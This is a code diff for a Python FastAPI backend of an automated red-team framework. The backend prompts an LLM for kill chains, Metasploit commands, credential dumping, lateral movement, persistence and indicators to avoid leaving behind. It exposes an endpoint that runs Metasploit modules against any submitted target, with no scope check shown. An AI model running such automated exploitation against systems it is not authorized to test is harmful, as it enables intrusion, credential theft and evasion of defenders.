-   {{"service": "nombre", "vuln": "CVE o descripción", "exploit": "módulo metasploit", "access": "tipo de acceso"}}
+2. **VECTORES DE ATAQUE IDENTIFICADOS**: Lista cada vector con:
+   - MITRE ATT&CK Technique ID
+   - Descripción del vector
+   - Probabilidad de éxito (Alta/Media/Baja)
+   - Impacto potencial
 
-3. COMANDOS METASPLOIT: Para cada vulnerabilidad explotable, proporciona el comando completo:
+3. **KILL CHAIN RECOMENDADA**: Secuencia de pasos para compromiso:
+   - Initial Access → Execution → Persistence → Privilege Escalation → etc.
+
+4. **COMANDOS ESPECÍFICOS**: Para cada técnica, proporciona:
    ```
-   use exploit/...
-   set RHOSTS {target}
-   set RPORT puerto
-   run
-   ```
-
-4. COMANDOS SQLMAP: Si hay indicios de SQL Injection:
-   ```
-   sqlmap -u "URL" --dbs
+   # Técnica: T1XXX - Nombre
+   comando_especifico
    ```
 
-5. PRIORIDAD DE EXPLOTACIÓN: Ordena las vulnerabilidades por facilidad de explotación y impacto
+5. **EXPLOITS METASPLOIT RECOMENDADOS**:
+   - use exploit/...
+   - set RHOSTS {target}
+   - run
 
-6. RECOMENDACIONES: Próximos pasos para continuar la auditoría
+6. **POST-EXPLOTACIÓN**: Si se logra acceso inicial:
+   - Credential dumping
+   - Lateral movement
+   - Persistence mechanisms
 
-Responde en español. Sé muy específico con los módulos de Metasploit y comandos."""
+7. **INDICADORES DE COMPROMISO (IOCs)** a evitar generar
+
+Responde en español. Sé específico con técnicas, herramientas y comandos."""
 
     try:
-        async with httpx.AsyncClient(timeout=90.0) as http_client:
+        async with httpx.AsyncClient(timeout=120.0) as http_client:
             response = await http_client.post(
                 KIMI_API_URL,
-                headers={
-                    "Authorization": f"Bearer {KIMI_API_KEY}",
-                    "Content-Type": "application/json"
-                },
+                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                 json={
                     "model": "kimi-k2-0711-preview",
                     "messages": [
-                        {"role": "system", "content": "Eres un experto pentester con conocimiento profundo de Metasploit, Kali Linux, y explotación de vulnerabilidades. Siempre proporcionas comandos específicos y ejecutables."},
+                        {"role": "system", "content": "Eres un Red Team operator experto con certificaciones OSCP, OSCE, CRTO. Tu especialidad es identificar vectores de ataque y proporcionar rutas de compromiso detalladas usando MITRE ATT&CK."},
                         {"role": "user", "content": prompt}
                     ],
-                    "temperature": 0.5,
-                    "max_tokens": 6000
+                    "temperature": 0.4,
+                    "max_tokens": 8000
                 }
             )
             
@@ -316,71 +505,34 @@ Responde en español. Sé muy específico con los módulos de Metasploit y coman
                 data = response.json()
                 ai_response = data["choices"][0]["message"]["content"]
                 
-                # Extract exploit suggestions
+                # Extract attack paths and exploits
                 exploits = []
                 attack_paths = []
                 
-                lines = ai_response.split('\n')
-                current_exploit = None
-                
-                for line in lines:
-                    line_lower = line.lower().strip()
-                    
-                    # Parse Metasploit modules
-                    if 'use ' in line_lower and ('exploit/' in line_lower or 'auxiliary/' in line_lower):
+                for line in ai_response.split('\n'):
+                    if 'use ' in line.lower() and ('exploit/' in line.lower() or 'auxiliary/' in line.lower() or 'post/' in line.lower()):
                         match = re.search(r'use\s+((?:exploit|auxiliary|post)/[^\s]+)', line, re.IGNORECASE)
                         if match:
-                            current_exploit = {"type": "metasploit", "module": match.group(1), "commands": [line.strip()]}
-                    elif current_exploit and ('set ' in line_lower or 'run' in line_lower or 'exploit' == line_lower):
-                        current_exploit["commands"].append(line.strip())
-                        if 'run' in line_lower or 'exploit' == line_lower:
-                            exploits.append(current_exploit)
-                            current_exploit = None
-                    
-                    # Parse SQLmap commands
-                    if 'sqlmap' in line_lower:
-                        exploits.append({"type": "sqlmap", "command": line.strip()})
-                    
-                    # Parse attack paths from JSON
-                    if '{"service"' in line or "{'service'" in line:
-                        try:
-                            path_match = re.search(r'\{[^}]+\}', line)
-                            if path_match:
-                                path = json.loads(path_match.group().replace("'", '"'))
-                                attack_paths.append(path)
-                        except:
-                            pass
+                            exploits.append({"type": "metasploit", "module": match.group(1), "command": line.strip()})
+                    if re.search(r'T\d{4}', line):
+                        attack_paths.append(line.strip())
                 
-                return {
-                    "analysis": ai_response,
-                    "exploits": exploits,
-                    "attack_paths": attack_paths
-                }
+                return {"analysis": ai_response, "exploits": exploits, "attack_paths": attack_paths}
             else:
-                return {
-                    "analysis": f"Error de API Kimi: {response.status_code} - {response.text}",
-                    "exploits": [],
-                    "attack_paths": []
-                }
-                
+                return {"analysis": f"API Error: {response.status_code}", "exploits": [], "attack_paths": []}
     except Exception as e:
-        logger.error(f"Error calling Kimi API: {str(e)}")
-        return {
-            "analysis": f"Error al conectar con Kimi: {str(e)}",
-            "exploits": [],
-            "attack_paths": []
-        }
+        return {"analysis": f"Error: {str(e)}", "exploits": [], "attack_paths": []}
 
-def build_attack_tree(scan_id: str, target: str, results: Dict[str, Any], ai_analysis: Dict[str, Any]) -> Dict[str, Any]:
-    """Build attack tree from scan results"""
+def build_attack_tree(scan_id: str, target: str, results: Dict[str, Any], phases: List[str], ai_data: Dict) -> Dict[str, Any]:
     tree = {
         "scan_id": scan_id,
         "root": {
             "id": "root",
             "type": "target",
             "name": target,
-            "description": f"Objetivo principal: {target}",
+            "description": f"Target: {target} | Phases: {', '.join(phases)}",
             "status": "testing",
+            "mitre": None,
             "children": []
         },
         "nodes": {}
@@ -388,243 +540,241 @@ def build_attack_tree(scan_id: str, target: str, results: Dict[str, Any], ai_ana
     
     node_id = 0
     
-    # Add services from nmap
-    if "nmap" in results and "ports" in results["nmap"]:
-        for port_info in results["nmap"]["ports"]:
-            node_id += 1
-            service_node_id = f"service_{node_id}"
-            service_node = {
-                "id": service_node_id,
-                "parent_id": "root",
-                "type": "service",
-                "name": f"{port_info['service']} ({port_info['port']})",
-                "description": f"Puerto {port_info['port']} - Estado: {port_info['state']}",
-                "status": "pending",
-                "severity": "info",
-                "data": port_info,
-                "children": []
-            }
-            tree["nodes"][service_node_id] = service_node
-            tree["root"]["children"].append(service_node_id)
-    
-    # Add vulnerabilities from nikto
-    if "nikto" in results and "vulnerabilities" in results["nikto"]:
-        for vuln in results["nikto"]["vulnerabilities"][:10]:  # Limit to 10
-            node_id += 1
-            vuln_node_id = f"vuln_{node_id}"
-            
-            # Determine severity based on keywords
-            severity = "medium"
-            vuln_lower = vuln.lower()
-            if "critical" in vuln_lower or "rce" in vuln_lower or "remote code" in vuln_lower:
-                severity = "critical"
-            elif "sql" in vuln_lower or "injection" in vuln_lower or "xss" in vuln_lower:
-                severity = "high"
-            elif "disclosure" in vuln_lower or "info" in vuln_lower:
-                severity = "low"
-            
-            vuln_node = {
-                "id": vuln_node_id,
-                "parent_id": "root",
-                "type": "vulnerability",
-                "name": vuln[:50] + "..." if len(vuln) > 50 else vuln,
-                "description": vuln,
-                "status": "pending",
-                "severity": severity,
-                "data": {"raw": vuln},
-                "children": []
-            }
-            tree["nodes"][vuln_node_id] = vuln_node
-            tree["root"]["children"].append(vuln_node_id)
-    
-    # Add WAF info
-    if "waf" in results and results["waf"].get("waf"):
+    # Add nodes for each phase
+    for phase in phases:
         node_id += 1
-        waf_node_id = f"waf_{node_id}"
-        waf_node = {
-            "id": waf_node_id,
+        phase_id = f"phase_{phase}"
+        tactic = MITRE_TACTICS.get(phase, {})
+        
+        phase_node = {
+            "id": phase_id,
             "parent_id": "root",
-            "type": "defense",
-            "name": f"WAF: {results['waf']['waf']}",
-            "description": f"Firewall detectado: {results['waf']['waf']}",
-            "status": "verified",
+            "type": "phase",
+            "name": f"{tactic.get('name', phase.upper())} ({tactic.get('id', '')})",
+            "description": tactic.get('description', ''),
+            "status": "completed" if phase in results else "pending",
             "severity": "info",
-            "data": results["waf"],
+            "mitre": tactic.get('id'),
+            "data": {},
             "children": []
         }
-        tree["nodes"][waf_node_id] = waf_node
-        tree["root"]["children"].append(waf_node_id)
+        tree["nodes"][phase_id] = phase_node
+        tree["root"]["children"].append(phase_id)
+        
+        # Add tool results under phase
+        for tool_id, tool_result in results.items():
+            tool_info = RED_TEAM_TOOLS.get(tool_id, {})
+            if tool_info.get("phase") == phase:
+                node_id += 1
+                tool_node_id = f"tool_{node_id}"
+                
+                tool_node = {
+                    "id": tool_node_id,
+                    "parent_id": phase_id,
+                    "type": "tool",
+                    "name": f"{tool_id.upper()} - {tool_info.get('mitre', '')}",
+                    "description": tool_info.get('desc', ''),
+                    "status": "success" if not tool_result.get("error") else "failed",
+                    "severity": "info",
+                    "mitre": tool_info.get('mitre'),
+                    "data": tool_result,
+                    "children": []
+                }
+                tree["nodes"][tool_node_id] = tool_node
+                phase_node["children"].append(tool_node_id)
+                
+                # Add findings as children
+                if "ports" in tool_result:
+                    for port_info in tool_result["ports"][:10]:
+                        node_id += 1
+                        port_node_id = f"port_{node_id}"
+                        tree["nodes"][port_node_id] = {
+                            "id": port_node_id,
+                            "parent_id": tool_node_id,
+                            "type": "service",
+                            "name": f"{port_info['port']} - {port_info['service']}",
+                            "description": f"State: {port_info['state']}",
+                            "status": "pending",
+                            "severity": "medium" if port_info['state'] == 'open' else "low",
+                            "mitre": "T1595",
+                            "data": port_info,
+                            "children": []
+                        }
+                        tool_node["children"].append(port_node_id)
+                
+                if "vulnerabilities" in tool_result:
+                    for vuln in tool_result["vulnerabilities"][:10]:
+                        node_id += 1
+                        vuln_node_id = f"vuln_{node_id}"
+                        tree["nodes"][vuln_node_id] = {
+                            "id": vuln_node_id,
+                            "parent_id": tool_node_id,
+                            "type": "vulnerability",
+                            "name": vuln.get("finding", str(vuln))[:50],
+                            "description": vuln.get("finding", str(vuln)),
+                            "status": "pending",
+                            "severity": vuln.get("severity", "medium"),
+                            "mitre": "T1190",
+                            "data": vuln,
+                            "children": []
+                        }
+                        tool_node["children"].append(vuln_node_id)
     
-    # Add subdomains
-    if "subfinder" in results and "subdomains" in results["subfinder"]:
-        for subdomain in results["subfinder"]["subdomains"][:5]:  # Limit to 5
+    # Add AI-suggested exploits
+    if ai_data.get("exploits"):
+        node_id += 1
+        exploit_phase_id = f"exploits_{node_id}"
+        exploit_phase = {
+            "id": exploit_phase_id,
+            "parent_id": "root",
+            "type": "phase",
+            "name": "RECOMMENDED EXPLOITS",
+            "description": "AI-generated exploitation recommendations",
+            "status": "pending",
+            "severity": "critical",
+            "mitre": "TA0002",
+            "data": {},
+            "children": []
+        }
+        tree["nodes"][exploit_phase_id] = exploit_phase
+        tree["root"]["children"].append(exploit_phase_id)
+        
+        for exploit in ai_data["exploits"]:
             node_id += 1
-            sub_node_id = f"subdomain_{node_id}"
-            sub_node = {
-                "id": sub_node_id,
-                "parent_id": "root",
-                "type": "subdomain",
-                "name": subdomain,
-                "description": f"Subdominio descubierto: {subdomain}",
+            exp_node_id = f"exploit_{node_id}"
+            tree["nodes"][exp_node_id] = {
+                "id": exp_node_id,
+                "parent_id": exploit_phase_id,
+                "type": "exploit",
+                "name": exploit.get("module", "Unknown"),
+                "description": exploit.get("command", ""),
                 "status": "pending",
-                "severity": "info",
-                "data": {"subdomain": subdomain},
+                "severity": "critical",
+                "mitre": "T1203",
+                "data": exploit,
                 "children": []
             }
-            tree["nodes"][sub_node_id] = sub_node
-            tree["root"]["children"].append(sub_node_id)
-    
-    # Add exploit suggestions from AI
-    if "exploits" in ai_analysis:
-        for exploit in ai_analysis["exploits"]:
-            node_id += 1
-            exploit_node_id = f"exploit_{node_id}"
-            
-            if exploit.get("type") == "metasploit":
-                exploit_node = {
-                    "id": exploit_node_id,
-                    "parent_id": "root",
-                    "type": "exploit",
-                    "name": exploit.get("module", "Metasploit Module"),
-                    "description": "\n".join(exploit.get("commands", [])),
-                    "status": "pending",
-                    "severity": "critical",
-                    "data": exploit,
-                    "children": []
-                }
-            else:
-                exploit_node = {
-                    "id": exploit_node_id,
-                    "parent_id": "root",
-                    "type": "exploit",
-                    "name": exploit.get("type", "Exploit").upper(),
-                    "description": exploit.get("command", ""),
-                    "status": "pending",
-                    "severity": "high",
-                    "data": exploit,
-                    "children": []
-                }
-            
-            tree["nodes"][exploit_node_id] = exploit_node
-            tree["root"]["children"].append(exploit_node_id)
+            exploit_phase["children"].append(exp_node_id)
     
     return tree
 
-async def run_scan_background(scan_id: str, target: str, scan_types: List[str]):
-    """Background task to run all scans"""
+async def run_scan_background(scan_id: str, target: str, phases: List[str], tools: List[str]):
     global scan_progress, attack_trees
     
     scan_progress[scan_id] = {
-        "status": "running",
-        "current_tool": None,
-        "progress": 0,
-        "results": {},
-        "ai_analysis": None,
-        "exploit_suggestions": [],
-        "attack_tree": None
+        "status": "running", "current_tool": None, "progress": 0,
+        "results": {}, "ai_analysis": None, "attack_tree": None
     }
     
-    total_tools = len(scan_types) + 1  # +1 for AI analysis
+    # Determine tools to run based on phases
+    tools_to_run = tools if tools else []
+    if not tools_to_run:
+        for phase in phases:
+            for tool_id, tool_info in RED_TEAM_TOOLS.items():
+                if tool_info["phase"] == phase:
+                    tools_to_run.append(tool_id)
+    
+    total_steps = len(tools_to_run) + 1
     completed = 0
     
     try:
-        for tool in scan_types:
-            scan_progress[scan_id]["current_tool"] = tool
-            scan_progress[scan_id]["progress"] = int((completed / total_tools) * 100)
+        for tool_id in tools_to_run:
+            scan_progress[scan_id]["current_tool"] = tool_id
+            scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
             
-            result = await run_tool(tool, target, scan_id)
-            scan_progress[scan_id]["results"][tool] = result
+            result = await run_tool(tool_id, target)
+            scan_progress[scan_id]["results"][tool_id] = result
             completed += 1
-            
-        # AI Analysis
-        scan_progress[scan_id]["current_tool"] = "kimi_ai"
-        scan_progress[scan_id]["progress"] = int((completed / total_tools) * 100)
         
-        ai_result = await analyze_with_kimi(scan_progress[scan_id]["results"], target)
+        # AI Analysis
+        scan_progress[scan_id]["current_tool"] = "kimi_ai_analysis"
+        scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
+        
+        ai_result = await analyze_with_kimi(scan_progress[scan_id]["results"], target, phases)
         scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
-        scan_progress[scan_id]["exploit_suggestions"] = ai_result["exploits"]
+        scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])
         
         # Build attack tree
-        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], ai_result)
+        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result)
         scan_progress[scan_id]["attack_tree"] = attack_tree
         attack_trees[scan_id] = attack_tree
         
-        # Mark as completed
         scan_progress[scan_id]["status"] = "completed"
         scan_progress[scan_id]["progress"] = 100
         scan_progress[scan_id]["current_tool"] = None
         
         # Save to database
-        scan_doc = {
-            "id": scan_id,
-            "target": target,
-            "status": "completed",
-            "tools_used": scan_types,
+        await db.scans.insert_one({
+            "id": scan_id, "target": target, "status": "completed",
+            "phases": phases, "tools_used": tools_to_run,
             "results": scan_progress[scan_id]["results"],
             "ai_analysis": scan_progress[scan_id]["ai_analysis"],
-            "exploit_suggestions": scan_progress[scan_id]["exploit_suggestions"],
+            "exploits": scan_progress[scan_id]["exploits"],
             "attack_tree": attack_tree,
             "created_at": datetime.now(timezone.utc).isoformat(),
             "updated_at": datetime.now(timezone.utc).isoformat()
-        }
-        await db.scans.insert_one(scan_doc)
+        })
         
     except Exception as e:
         logger.error(f"Scan error: {str(e)}")
         scan_progress[scan_id]["status"] = "error"
         scan_progress[scan_id]["error"] = str(e)
 
-# API Routes
+# =============================================================================
+# API ROUTES
+# =============================================================================
 @api_router.get("/")
 async def root():
-    return {"message": "Kali Pentesting Automation Suite API", "version": "2.0.0"}
+    return {"message": "Red Team Automation Framework", "version": "3.0.0", "mitre_tactics": len(MITRE_TACTICS)}
+
+@api_router.get("/mitre/tactics")
+async def get_mitre_tactics():
+    return {"tactics": MITRE_TACTICS}
+
+@api_router.get("/mitre/tactics/{tactic_id}")
+async def get_tactic_techniques(tactic_id: str):
+    tactic = MITRE_TACTICS.get(tactic_id)
+    if not tactic:
+        raise HTTPException(status_code=404, detail="Tactic not found")
+    return tactic
+
+@api_router.get("/tools")
+async def get_tools(phase: str = None):
+    if phase:
+        tools = {k: v for k, v in RED_TEAM_TOOLS.items() if v["phase"] == phase}
+    else:
+        tools = RED_TEAM_TOOLS
+    return {"tools": tools, "count": len(tools)}
 
 @api_router.post("/scan/start")
 async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
-    """Start a new penetration test scan"""
     scan_id = str(uuid.uuid4())
+    target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
     
-    target = scan.target.strip()
     if not target:
-        raise HTTPException(status_code=400, detail="Target is required")
+        raise HTTPException(status_code=400, detail="Target required")
     
-    clean_target = target.replace("https://", "").replace("http://", "").split("/")[0]
+    background_tasks.add_task(run_scan_background, scan_id, target, scan.scan_phases, scan.tools)
     
-    background_tasks.add_task(run_scan_background, scan_id, clean_target, scan.scan_types)
-    
-    return {
-        "scan_id": scan_id,
-        "target": clean_target,
-        "status": "started",
-        "tools": scan.scan_types
-    }
+    return {"scan_id": scan_id, "target": target, "phases": scan.scan_phases, "status": "started"}
 
 @api_router.get("/scan/{scan_id}/status")
 async def get_scan_status(scan_id: str):
-    """Get current scan status and progress"""
     if scan_id in scan_progress:
-        progress = scan_progress[scan_id]
+        p = scan_progress[scan_id]
         return {
-            "scan_id": scan_id,
-            "status": progress["status"],
-            "current_tool": progress["current_tool"],
-            "progress": progress["progress"],
-            "results": progress["results"],
-            "ai_analysis": progress.get("ai_analysis"),
-            "exploit_suggestions": progress.get("exploit_suggestions", []),
-            "attack_tree": progress.get("attack_tree")
+            "scan_id": scan_id, "status": p["status"], "current_tool": p["current_tool"],
+            "progress": p["progress"], "results": p["results"],
+            "ai_analysis": p.get("ai_analysis"), "exploits": p.get("exploits", []),
+            "attack_tree": p.get("attack_tree")
         }
     
     scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
     if scan:
         return {
-            "scan_id": scan_id,
-            "status": scan["status"],
-            "current_tool": None,
-            "progress": 100,
-            "results": scan.get("results", {}),
-            "ai_analysis": scan.get("ai_analysis"),
-            "exploit_suggestions": scan.get("exploit_suggestions", []),
+            "scan_id": scan_id, "status": scan["status"], "current_tool": None,
+            "progress": 100, "results": scan.get("results", {}),
+            "ai_analysis": scan.get("ai_analysis"), "exploits": scan.get("exploits", []),
             "attack_tree": scan.get("attack_tree")
         }
     
@@ -632,20 +782,16 @@ async def get_scan_status(scan_id: str):
 
 @api_router.get("/scan/{scan_id}/tree")
 async def get_attack_tree(scan_id: str):
-    """Get attack tree for a scan"""
     if scan_id in attack_trees:
         return attack_trees[scan_id]
-    
     scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
     if scan and "attack_tree" in scan:
         attack_trees[scan_id] = scan["attack_tree"]
         return scan["attack_tree"]
-    
     raise HTTPException(status_code=404, detail="Attack tree not found")
 
 @api_router.put("/scan/{scan_id}/tree/node/{node_id}")
 async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
-    """Update attack tree node status"""
     if scan_id not in attack_trees:
         scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
         if scan and "attack_tree" in scan:
@@ -666,201 +812,100 @@ async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus)
     else:
         raise HTTPException(status_code=404, detail="Node not found")
     
-    # Update in database
-    await db.scans.update_one(
-        {"id": scan_id},
-        {"$set": {"attack_tree": tree, "updated_at": datetime.now(timezone.utc).isoformat()}}
-    )
-    
+    await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree, "updated_at": datetime.now(timezone.utc).isoformat()}})
     return {"message": "Node updated", "node_id": node_id, "status": update.status}
 
 @api_router.post("/scan/{scan_id}/tree/node")
-async def add_tree_node(scan_id: str, node: AttackNode):
-    """Add a new node to attack tree"""
+async def add_tree_node(scan_id: str, node: AddNodeRequest):
     if scan_id not in attack_trees:
         scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
-        if scan and "attack_tree" in scan:
+        if scan:
             attack_trees[scan_id] = scan["attack_tree"]
         else:
-            raise HTTPException(status_code=404, detail="Attack tree not found")
+            raise HTTPException(status_code=404, detail="Scan not found")
     
     tree = attack_trees[scan_id]
+    new_node_id = f"custom_{uuid.uuid4().hex[:8]}"
     
-    # Add node
-    tree["nodes"][node.id] = node.model_dump()
+    new_node = {
+        "id": new_node_id, "parent_id": node.parent_id, "type": node.type,
+        "name": node.name, "description": node.description, "status": "pending",
+        "severity": node.severity, "mitre": node.mitre_id, "data": node.data, "children": []
+    }
     
-    # Add to parent's children
+    tree["nodes"][new_node_id] = new_node
+    
     if node.parent_id == "root":
-        tree["root"]["children"].append(node.id)
+        tree["root"]["children"].append(new_node_id)
     elif node.parent_id in tree["nodes"]:
-        tree["nodes"][node.parent_id]["children"].append(node.id)
+        tree["nodes"][node.parent_id]["children"].append(new_node_id)
     
-    # Update in database
-    await db.scans.update_one(
-        {"id": scan_id},
-        {"$set": {"attack_tree": tree, "updated_at": datetime.now(timezone.utc).isoformat()}}
-    )
-    
-    return {"message": "Node added", "node": node.model_dump()}
+    await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree}})
+    return {"message": "Node added", "node": new_node}
 
 @api_router.post("/metasploit/execute")
-async def execute_metasploit(exploit: MetasploitExploit):
-    """Execute a Metasploit module"""
-    result = await run_metasploit_module(
-        exploit.module,
-        exploit.target_host,
-        exploit.target_port,
-        exploit.options
+async def execute_metasploit(exploit: ExploitExecute):
+    result = await run_metasploit(
+        exploit.module, exploit.target_host, exploit.target_port,
+        exploit.options, exploit.lhost, exploit.lport
     )
     
-    # Update attack tree node if provided
-    if exploit.scan_id and exploit.node_id:
-        if exploit.scan_id in attack_trees:
-            tree = attack_trees[exploit.scan_id]
-            if exploit.node_id in tree["nodes"]:
-                node = tree["nodes"][exploit.node_id]
-                node["status"] = "success" if result.get("success") else "failed"
-                node["data"]["exploit_result"] = result
-                
-                # Add child node for access if session opened
-                if result.get("session_opened"):
-                    access_node_id = f"access_{uuid.uuid4().hex[:8]}"
-                    access_node = {
-                        "id": access_node_id,
-                        "parent_id": exploit.node_id,
-                        "type": "access",
-                        "name": "Sesión Obtenida",
-                        "description": f"Sesión Meterpreter/Shell abierta via {exploit.module}",
-                        "status": "success",
-                        "severity": "critical",
-                        "data": {"session": True},
-                        "children": []
-                    }
-                    tree["nodes"][access_node_id] = access_node
-                    node["children"].append(access_node_id)
-                
-                await db.scans.update_one(
-                    {"id": exploit.scan_id},
-                    {"$set": {"attack_tree": tree, "updated_at": datetime.now(timezone.utc).isoformat()}}
-                )
+    if exploit.scan_id and exploit.node_id and exploit.scan_id in attack_trees:
+        tree = attack_trees[exploit.scan_id]
+        if exploit.node_id in tree["nodes"]:
+            tree["nodes"][exploit.node_id]["status"] = "success" if result.get("success") else "failed"
+            tree["nodes"][exploit.node_id]["data"]["exploit_result"] = result
+            
+            if result.get("session_opened"):
+                session_id = f"session_{uuid.uuid4().hex[:8]}"
+                tree["nodes"][session_id] = {
+                    "id": session_id, "parent_id": exploit.node_id, "type": "access",
+                    "name": "SESSION OBTAINED", "description": f"Meterpreter/Shell via {exploit.module}",
+                    "status": "success", "severity": "critical", "mitre": "T1059",
+                    "data": {"session": True}, "children": []
+                }
+                tree["nodes"][exploit.node_id]["children"].append(session_id)
+            
+            await db.scans.update_one({"id": exploit.scan_id}, {"$set": {"attack_tree": tree}})
     
     return result
 
 @api_router.get("/metasploit/modules")
-async def search_metasploit_modules(query: str = "", category: str = ""):
-    """Search for Metasploit modules"""
-    modules = [
-        # Exploits
-        {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "description": "Shellshock (CVE-2014-6271)", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/unix/webapp/php_cgi_arg_injection", "description": "PHP CGI Argument Injection", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/multi/http/tomcat_mgr_upload", "description": "Tomcat Manager Upload", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/multi/http/struts2_content_type_ognl", "description": "Apache Struts 2 RCE", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/windows/smb/ms17_010_eternalblue", "description": "EternalBlue SMB RCE", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/multi/http/jenkins_script_console", "description": "Jenkins Script Console RCE", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/unix/webapp/drupal_drupalgeddon2", "description": "Drupalgeddon2 RCE", "rank": "excellent", "category": "exploit"},
-        {"name": "exploit/multi/http/wp_crop_rce", "description": "WordPress Crop RCE", "rank": "excellent", "category": "exploit"},
-        # Auxiliary
-        {"name": "auxiliary/scanner/http/dir_scanner", "description": "HTTP Directory Scanner", "rank": "normal", "category": "auxiliary"},
-        {"name": "auxiliary/scanner/http/http_version", "description": "HTTP Version Detection", "rank": "normal", "category": "auxiliary"},
-        {"name": "auxiliary/scanner/ssh/ssh_login", "description": "SSH Login Bruteforce", "rank": "normal", "category": "auxiliary"},
-        {"name": "auxiliary/scanner/smb/smb_ms17_010", "description": "MS17-010 SMB Scanner", "rank": "normal", "category": "auxiliary"},
-        {"name": "auxiliary/scanner/http/wordpress_scanner", "description": "WordPress Scanner", "rank": "normal", "category": "auxiliary"},
-        {"name": "auxiliary/scanner/mysql/mysql_login", "description": "MySQL Login Bruteforce", "rank": "normal", "category": "auxiliary"},
-        # Post
-        {"name": "post/multi/gather/env", "description": "Gather Environment Variables", "rank": "normal", "category": "post"},
-        {"name": "post/linux/gather/hashdump", "description": "Linux Password Hash Dump", "rank": "normal", "category": "post"},
-        {"name": "post/windows/gather/hashdump", "description": "Windows Password Hash Dump", "rank": "normal", "category": "post"},
-    ]
-    
-    filtered = modules
+async def get_metasploit_modules(query: str = "", category: str = "", mitre: str = ""):
+    modules = METASPLOIT_MODULES
     
     if category:
-        filtered = [m for m in filtered if m["category"] == category]
-    
+        modules = [m for m in modules if m["category"] == category]
+    if mitre:
+        modules = [m for m in modules if m.get("mitre", "") == mitre]
     if query:
-        filtered = [m for m in filtered if query.lower() in m["name"].lower() or query.lower() in m["description"].lower()]
+        modules = [m for m in modules if query.lower() in m["name"].lower() or query.lower() in m["desc"].lower()]
     
-    return {"modules": filtered}
+    return {"modules": modules, "count": len(modules)}
 
-@api_router.get("/scan/history", response_model=List[ScanHistoryItem])
+@api_router.get("/scan/history")
 async def get_scan_history():
-    """Get list of all completed scans"""
-    scans = await db.scans.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
-    
-    history = []
-    for scan in scans:
-        vuln_count = 0
-        if "results" in scan:
-            for tool, result in scan["results"].items():
-                if isinstance(result, dict):
-                    if "vulnerabilities" in result:
-                        vuln_count += len(result["vulnerabilities"])
-                    if "ports" in result:
-                        vuln_count += len(result["ports"])
-        
-        history.append(ScanHistoryItem(
-            id=scan["id"],
-            target=scan["target"],
-            status=scan["status"],
-            tools_used=scan.get("tools_used", []),
-            vulnerabilities_found=vuln_count,
-            created_at=scan["created_at"]
-        ))
-    
-    return history
+    scans = await db.scans.find({}, {"_id": 0, "id": 1, "target": 1, "status": 1, "phases": 1, "created_at": 1}).sort("created_at", -1).to_list(100)
+    return scans
 
 @api_router.get("/scan/{scan_id}/report")
 async def get_scan_report(scan_id: str):
-    """Get full scan report for export"""
     scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
     if not scan:
         raise HTTPException(status_code=404, detail="Scan not found")
-    
-    return {
-        "report": scan,
-        "generated_at": datetime.now(timezone.utc).isoformat()
-    }
+    return {"report": scan, "generated_at": datetime.now(timezone.utc).isoformat()}
 
 @api_router.delete("/scan/{scan_id}")
 async def delete_scan(scan_id: str):
-    """Delete a scan from history"""
     result = await db.scans.delete_one({"id": scan_id})
     if result.deleted_count == 0:
         raise HTTPException(status_code=404, detail="Scan not found")
-    
     if scan_id in scan_progress:
         del scan_progress[scan_id]
     if scan_id in attack_trees:
         del attack_trees[scan_id]
-    
-    return {"message": "Scan deleted", "scan_id": scan_id}
+    return {"message": "Scan deleted"}
 
-@api_router.post("/ai/analyze")
-async def manual_ai_analysis(request: AIAnalysisRequest):
-    """Manually trigger AI analysis on results"""
-    target = "unknown"
-    
-    scan = await db.scans.find_one({"id": request.scan_id}, {"_id": 0})
-    if scan:
-        target = scan.get("target", "unknown")
-    
-    result = await analyze_with_kimi(request.results, target)
-    return result
-
-@api_router.get("/tools")
-async def get_available_tools():
-    """Get list of available pentesting tools"""
-    tools = [
-        {"id": "waf", "name": "WAF Detection", "description": "Detecta Web Application Firewalls usando wafw00f", "icon": "shield"},
-        {"id": "nmap", "name": "Nmap", "description": "Escaneo de puertos y detección de servicios", "icon": "radar"},
-        {"id": "nikto", "name": "Nikto", "description": "Escaneo de vulnerabilidades web", "icon": "bug"},
-        {"id": "whatweb", "name": "WhatWeb", "description": "Fingerprinting de tecnologías web", "icon": "fingerprint"},
-        {"id": "subfinder", "name": "Subfinder", "description": "Enumeración de subdominios", "icon": "globe"},
-        {"id": "sn1per", "name": "Sn1per", "description": "Framework de reconocimiento automatizado", "icon": "crosshair"}
-    ]
-    return {"tools": tools}
-
-# Include the router in the main app
 app.include_router(api_router)
 
 app.add_middleware(
